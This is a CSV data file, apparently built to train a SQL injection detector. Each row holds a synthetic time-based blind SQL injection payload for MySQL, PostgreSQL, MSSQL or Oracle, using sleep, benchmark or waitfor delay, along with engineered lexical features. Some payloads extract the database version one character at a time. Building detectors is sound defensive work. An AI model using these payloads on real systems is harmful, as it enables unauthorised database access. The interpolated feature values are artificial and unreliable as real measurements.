id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000633,attack,time,1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000105,0.21926661146183213,81.45784363790378,23.04928694200875,3.138246096959847,19.0,10.0,40.50713057991253,11.950713057991253,0.23347663532803647,0.12288243964633497,0.49687617973183995,0.1467647452937886,0.9507130579912526,0.04928694200874739,2.0,0.0,0.0,1.0,0.0,6.901426115982505,0.04928694200874738,1.0,0.0,3.0,0.9507130579912524,0.049286942008747364,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000634,attack,time,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000035,0.7331249240047079,59.91554565755199,21.491554565755198,3.239646814717559,13.6554060876736,11.474663697265598,26.293921306857595,8.491554565755198,0.2304053992029673,0.1886526303260081,0.4381160590579508,0.1428259114130738,0.0,1.0,0.0,0.0,0.0,0.1638515219183997,0.0,5.3277030438368,0.0,0.0,1.0,0.16385152191840002,0.0,1.0,0.0,1.0,0.0,0.16385152191839963,1.0,0.0,0.0,0.16385152191839972,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000635,attack,time,"1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000066,0.6952341978827691,84.00115907182942,28.0,3.5512594088749743,16.0,21.0,35.53036629444776,11.470792777381662,0.19178677419552204,0.2517201411316227,0.4202131072064757,0.13627997746637957,0.8235975924605543,0.17640240753944575,0.0,0.0,0.0,1.0,0.0,6.4707927773816625,0.9999999999999999,0.0,1.0,1.0,0.8235975924605541,0.1764024075394457,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000636,attack,time,1  )   as cwsi where 7360  =  7360 or sleep  (  5  )  #,nearest_attack_euclidean,R000124,0.8446717342874528,57.871575303658794,21.73894769966738,3.4540576270983805,18.783156900997852,10.0,23.566313801995705,5.5221046006652355,0.32489952454243076,0.17390750605052674,0.4063285406141241,0.09486442879291845,0.26105230033261784,0.0,0.0,0.0,0.0,1.0,0.0,3.2610523003326177,0.0,0.0,0.0,1.0,0.26105230033261784,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.7389476996673822,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7389476996673823
SMOTE_000637,attack,time,"1%""  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000090,2.533054051085461,54.64439846828064,19.03208854850681,3.069084847201479,11.96791145149319,6.128354194027232,26.064177097013616,10.483955725746595,0.22204013304644452,0.10682336025925437,0.4772011158006595,0.19393539089364162,0.0,2.4518671772397873,0.0,0.0,0.0,1.0,0.0,4.516044274253404,1.4839557257465958,0.0,0.5160442742534042,1.0,0.0,1.0,0.0,0.5160442742534042,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000638,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   # igen",nearest_attack_euclidean,R000080,0.7626015868996455,76.57732209275123,27.761511860483253,3.8555882856945347,19.476976279033497,23.669416976617242,26.19244069758374,7.238488139516749,0.2551136594967578,0.3080894074178909,0.34209450787746454,0.09470242520788667,0.0,0.0,0.0,0.0,0.0,1.2384881395167486,0.0,4.0,0.0,0.0,1.0,1.2384881395167486,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.23848813951674863,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2384881395167486
SMOTE_000639,attack,time,"1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000066,1.4056638177456735,84.51410734696977,26.57948991255415,3.4519677984625807,16.355127521861462,20.289744956277076,36.57948991255415,11.289744956277074,0.1940618357543723,0.24000166047553742,0.4325976355182989,0.13333886825179142,1.0,0.0,0.0,0.0,0.0,1.0,0.0,6.644872478138537,0.6448724781385369,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.6448724781385369,0.355127521861463,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000640,attack,time,1'   )    )    or sleep  (  5  )   and    (    (   'uzhd' like 'uzhd,nearest_attack_euclidean,R000112,0.23665379351659824,67.78056204162309,20.0,3.0377593633647337,22.10971897918846,1.9451405104057695,33.72570255202885,10.0,0.32635306196440894,0.028655429830961907,0.4974284614252705,0.14756304677935875,3.9451405104057695,0.0,0.0,0.0,0.0,0.05485948959423015,0.0,5.9451405104057695,0.0,0.05485948959423026,0.0,0.05485948959423026,1.0,0.0,0.0,0.0,0.0,0.05485948959423026,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.05485948959423037,0.0,0.0,0.0,1.0,0.9451405104057697,0.0,0.0,0.0,0.0,0.0,0.0,0.9451405104057697,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9451405104057695
SMOTE_000641,attack,time,1   )    )    or sleep  (  5  )  #,nearest_attack_euclidean,R000048,1.502803422906676,32.83628197174952,12.775812018833651,2.581492255488789,8.163718028250477,2.0,17.672563943499043,5.0,0.25115032178203944,0.06103172301375802,0.5352386476698074,0.15257930753439505,0.38790600941682596,0.0,0.0,0.0,0.0,0.0,0.0,3.6120939905831744,0.0,0.0,0.0,0.0,0.3879060094168258,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.6120939905831742,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.6120939905831742
SMOTE_000642,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'nbzf' like 'nbzf,nearest_attack_euclidean,R000097,0.4940993016659671,102.71380985596744,23.648278439379606,3.2222893212707997,39.29655687875922,1.0,48.593113757518424,13.824139219689803,0.3827728859245362,0.0097604751701897,0.4727315167433812,0.13473512216189287,3.0,0.0,0.0,0.0,1.0,0.17586078031019647,0.0,9.648278439379606,0.0,0.0,0.0,1.1758607803101966,1.0,0.0,0.0,0.0,0.0,0.17586078031019647,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000643,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000079,0.6683803606249544,83.18685475542638,27.0,3.623348902107242,23.0,15.0,33.32237896285532,11.864475792571064,0.27787782629988506,0.181224669326012,0.39839412695090454,0.14250337742319838,3.0,0.0,0.0,0.0,0.0,1.0,0.0,5.8644757925710636,0.9999999999999999,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000644,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nond'  =  'nond",nearest_attack_euclidean,R000119,2.220080708551243,102.68886641491673,27.705042332696994,3.696014485575588,26.0,24.41008466539398,39.70504233269699,12.573739416825752,0.2538934163276695,0.23635293975803776,0.3867175833025154,0.12303606061177741,2.7212182504772553,0.0,0.8525211663484963,0.0,0.0,2.0,0.0,6.0,0.0,0.0,1.0,2.852521166348496,1.0,0.0,0.42626058317424814,0.0,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.4262605831742481,0.0,0.5737394168257519,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000645,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,nearest_attack_euclidean,R000096,1.232804891555623,91.80698300648437,22.467830501080726,3.136267926101768,32.71246891792752,3.957107334774304,44.158853086395396,10.978553667387152,0.3602428315264724,0.03875933408659496,0.4812094245126499,0.11978840987428266,0.244638416846788,0.0,0.0,0.0,1.0,0.244638416846788,0.0,8.489276833693575,0.0,0.0,0.0,1.2446384168467879,0.2446384168467881,0.0,0.0,1.0,0.0,0.24463841684678794,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.24463841684678803,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.244638416846788
SMOTE_000646,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000127,0.7838096909773057,59.80669740278578,23.0,3.657739590913802,21.0,10.0,22.0,6.806697402785781,0.3511467103224572,0.1672127192011701,0.3678679822425742,0.11377258823379842,1.0,0.0,1.6133948055715623,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,2.613394805571562,1.0,0.0,0.8066974027857812,0.19330259721421894,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000647,attack,time,"waitfor delay '0:0:5' and   (  ""ludp"" like ""ludp",nearest_attack_euclidean,R000099,2.2819520808174216,47.27086918978151,21.27086918978151,3.873737610065425,24.812607569344532,2.6354345948907554,12.187392430655468,7.635434594890755,0.5238639923933137,0.055565331968030665,0.2591875655677751,0.16138311007088052,1.2708691897815103,3.3645654051092446,0.0,0.0,0.0,0.3645654051092448,0.0,1.364565405109245,0.0,0.0,0.0,0.36456540510924484,0.6354345948907552,1.0,0.0,0.0,0.0,0.36456540510924484,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.36456540510924484,0.0,0.6354345948907552,0.6354345948907552,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6354345948907554
SMOTE_000648,attack,time,begin dbms_lock.sleep  (  5  ) ,nearest_attack_euclidean,R000140,0.2588365967531664,32.12809060949722,18.881253620052924,3.807449244535583,18.474985519788305,1.0,8.534358709761843,4.118746379947076,0.5770444646080564,0.03153026412290502,0.26292928717847697,0.1284959840905616,0.17811956992061406,0.0,0.0,0.0,0.0,0.0,0.0,2.0593731899735377,0.0,0.940626810026462,0.0,0.0,0.05937318997353802,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.05937318997353802,0.0,0.0,0.0,0.059373189973537965,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1187463799470763
SMOTE_000649,attack,time,waitfor delay '0:0:5' and 'dfzn'  =  'dfzn,nearest_attack_euclidean,R000144,1.31461485136139,42.97735313679406,19.48867656839703,3.9356589866604406,23.977353136794058,3.2443382841985144,7.755661715801487,8.0,0.5572306985502522,0.0752226441645732,0.1811174777273861,0.18642917955778857,4.266985147404457,0.9773531367940579,0.0,0.0,0.0,0.7556617158014856,0.0,0.0,0.0,0.0,0.0,0.7556617158014856,1.0,0.24433828419851433,0.0,0.0,0.0,0.7556617158014856,1.1102230246251565e-16,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000650,attack,time,"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000149,2.0269322759077326,80.51659110134543,21.549773304036297,3.091424160437941,27.516591101345433,2.0,39.0,12.0,0.3417252049955722,0.02484055830205388,0.4843908868900506,0.14904334981232326,0.48340889865456815,0.5165911013454318,0.0,0.0,1.0,0.0,0.0,8.0,0.9999999999999999,0.0,0.0,1.0,0.4834088986545681,0.5165911013454317,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,0.5165911013454318,0.48340889865456815,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000651,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,2.015907970387415,76.89730701014602,25.241501130668713,3.5100369709831933,23.931302487471168,10.0,33.276203165872396,9.689801356802455,0.3094601863420988,0.13526290609566696,0.43197796524417736,0.12329894231805683,0.0,2.344900678401227,0.0,0.0,0.0,1.4483002261337425,0.0,4.896600452267485,0.0,1.0,0.0,1.4483002261337423,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.44830022613374243,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.4483002261337425
SMOTE_000652,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.35081493012560344,32.28449882697694,16.570699296186167,3.4779611237111077,12.713799530790777,0.8568997653953891,9.713799530790777,9.0,0.3937845235556227,0.02596665955743603,0.30055237688996345,0.2796964399969778,0.0,0.0,2.0,0.0,0.0,0.0,0.0,1.9999999999999996,0.0,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.856899765395389,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8568997653953896
SMOTE_000653,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,1.5733355862227585,41.27723282383353,16.0,2.887820964675044,10.999999999999998,0.0,20.277232823833536,10.0,0.2671141555979911,-1.3877787807814457e-17,0.4900547938583806,0.2428310505436283,0.5693082059583836,0.8613835880832328,0.0,0.0,0.0,1.0,0.0,3.5693082059583836,0.0,4.0,0.0,1.0,0.5693082059583836,0.4306917940416163,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000654,attack,time,"1'+  (  select 'iyvn' where 9358  =  9358 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",nearest_attack_euclidean,R000083,0.4457516283308153,97.77329488777997,28.484470074813352,3.634592028511764,24.6563133832089,17.312626766417804,40.63251142975772,15.171843308395548,0.2526094170372266,0.177728602252722,0.4145297712568644,0.155132209453187,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.343686616791098,0.0,0.0,1.0,3.8281566916044505,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.9140783458022254,0.0,0.9140783458022254,0.0,0.08592165419777464,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.9140783458022255
SMOTE_000655,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,0.8470088733390374,26.9336675030858,17.933667503085804,4.017095717114448,12.746934002468643,4.439799498148517,2.813266499382838,6.933667503085804,0.4717323499096217,0.16844472634793106,0.10588576485694345,0.25393715888550383,2.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7469340024686435,0.1867335006171609,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000656,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.043215444656302594,100.0,33.22955044220453,4.069637740157632,39.0,7.0,35.0,19.0,0.39,0.07,0.35,0.19,2.0,0.0,2.0,0.0,0.0,0.0,1.0000000000000002,6.0,0.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0000000000000002,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000657,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 8  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000037,0.08896124966267437,100.0,33.55279477454982,4.078542757870864,39.0,7.0,35.0,19.0,0.39,0.07,0.35,0.19,2.0,0.0,2.0,0.0,0.0,0.0,1.0000000000000002,6.0,0.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0000000000000002,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000658,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000130,0.26260674440101867,86.91553999335292,27.1035427023434,3.563509038459783,23.155314053515102,15.310628107030205,36.19074107694911,12.258856755858503,0.26761275551607194,0.1762459295272202,0.41505970026743705,0.14108161468927075,0.0,3.051771351171701,0.0,0.0,0.0,1.0517713511717006,0.0,6.2070854046868025,0.9482286488282994,0.0,1.0,1.0517713511717006,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.9482286488282994,0.0,0.0,0.0,1.0,0.05177135117170062,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000659,attack,time,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000047,0.8386302270164471,79.38906409323127,23.389064093231262,3.3602626613683313,17.0,19.0,34.0,9.389064093231262,0.21414334025554882,0.23933667440326045,0.42828668051109764,0.1182333048300931,0.38906409323126323,0.0,0.0,0.0,0.0,1.0,0.0,6.0,0.0,0.0,1.0,1.0,0.38906409323126323,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000660,attack,time,"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  ""epfg"" like ""epfg",nearest_attack_euclidean,R000128,1.227477211575143,128.22604407008873,24.80089807138237,3.011841057719228,41.60179614276474,1.8008980713823712,66.8188594990298,18.004490356911855,0.32687610747595935,0.013849911401923251,0.519166883005948,0.1401070981161693,0.5973057858528876,3.203592285529483,0.0,0.0,1.0,0.0,0.0,13.203592285529485,0.0,0.0,0.0,1.0,0.19910192861762915,0.8008980713823708,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,1.0,0.8008980713823708,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.80089807138237
SMOTE_000661,attack,time,"1""  )   as gdcx where 2335  =  2335 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000142,0.6343393336165806,99.86290124324975,29.82741975135005,3.7463641631068025,30.82741975135005,18.0,40.03548149189971,11.0,0.30887379728466513,0.1803096132111018,0.4006273814307819,0.11018920807345112,0.0,0.8274197513500483,2.0,0.0,0.0,2.0,0.0,5.172580248649951,0.0,1.0,0.0,4.0,0.0,0.8274197513500485,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,1.0,1.0,0.8274197513500483,0.17258024864995156,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000662,attack,time,"1"" and sleep  (  5  )   and ""tdid"" like ""tdid",nearest_attack_euclidean,R000121,1.376987175817891,45.411578570946375,17.646314283785493,3.4518750761662744,22.176842858107253,2.0,14.823157141892747,6.411578570946372,0.48864329540244433,0.0440467839894238,0.3262222084018958,0.141087712206236,0.0,4.0,0.0,0.0,0.0,0.41157857094637296,0.0,1.9999999999999996,0.0,0.0,0.0,0.41157857094637285,0.0,1.0,0.0,0.0,0.0,0.411578570946373,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,1.5884214290536267,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.588421429053627
